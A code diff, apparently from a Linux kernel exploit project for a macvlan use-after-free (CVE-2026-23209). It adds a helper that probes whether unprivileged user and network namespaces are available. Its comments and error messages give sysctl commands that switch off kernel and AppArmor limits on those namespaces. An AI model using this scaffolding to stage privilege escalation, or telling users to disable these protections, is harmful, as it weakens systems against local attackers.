@@ -1,5 +1,7 @@
 #define _GNU_SOURCE
 #include "userns.h"
+#include <sys/stat.h>
+#include <errno.h>
 
 /*
  * Create a child process in new user+network namespaces.
@@ -15,6 +17,12 @@
  *   child:  runs with uid=0 in new user+net namespace
  *   child:  calls child_main() which the exploit provides
  *   parent: waitpid()
+ *
+ * IMPORTANT: CVE-2026-23209 (macvlan UAF) requires CAP_NET_ADMIN which
+ * can only be obtained via user namespaces for non-root users.
+ * On restrictive kernels, you may need:
+ *   sudo sysctl -w kernel.unprivileged_userns_clone=1
+ *   sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0
  */
 
 typedef int (*userns_child_fn_t)(void *arg);
@@ -24,6 +32,75 @@ struct userns_setup {
     void *arg;
     int ready_pipe[2];   /* parent signals child when maps are ready */
 };
+
+/*
+ * userns_check_available - Probe whether user+net namespaces can be created.
+ *
+ * Performs a probe clone() with CLONE_NEWUSER|CLONE_NEWNET to test if the
+ * kernel allows unprivileged user namespace creation. Does not execute any
+ * user code in the child.
+ *
+ * Returns: 0 if namespaces are available, -1 otherwise.
+ * On failure, prints diagnostic information to stderr.
+ */
+static int pause_wrapper(void *arg) {
+    (void)arg;
+    pause();
+    return 0;
+}
+
+int userns_check_available(void) {
+    static char test_stack[4096];
+
+    printf("[*] Probing user namespace availability...\n");
+
+    int pipefd[2];
+    if (pipe(pipefd) < 0) {
+        perror("[-] probe: pipe");
+        return -1;
+    }
+
+    pid_t probe = clone(
+        pause_wrapper,
+        test_stack + sizeof(test_stack),
+        CLONE_NEWUSER | CLONE_NEWNET | SIGCHLD,
+        NULL);
+
+    if (probe < 0) {
+        close(pipefd[0]);
+        close(pipefd[1]);
+
+        if (errno == EPERM) {
+            fprintf(stderr,
+                "[-] User namespace creation denied (EPERM).\n"
+                "[-] This typically means one of:\n"
+                "[-]   - kernel.unprivileged_userns_clone = 0\n"
+                "[-]   - kernel.apparmor_restrict_unprivileged_userns = 1\n"
+                "[-]   - AppArmor policy blocking user namespaces\n"
+                "[-]\n"
+                "[-] To enable, run as root:\n"
+                "[-]   sysctl -w kernel.unprivileged_userns_clone=1\n"
+                "[-]   sysctl -w kernel.apparmor_restrict_unprivileged_userns=0\n");
+        } else if (errno == EINVAL) {
+            fprintf(stderr,
+                "[-] Invalid clone flags (EINVAL).\n"
+                "[-] User namespaces may not be compiled into this kernel.\n");
+        } else {
+            fprintf(stderr, "[-] clone(NEWUSER|NEWNET) failed: %d (%s)\n",
+                    errno, strerror(errno));
+        }
+        return -1;
+    }
+
+    printf("[+] User namespace creation succeeded (pid=%d)\n", probe);
+
+    kill(probe, SIGKILL);
+    waitpid(probe, NULL, 0);
+    close(pipefd[0]);
+    close(pipefd[1]);
+
+    return 0;
+}
 
 static int userns_child(void *setup_arg) {
     struct userns_setup *s = (struct userns_setup *)setup_arg;
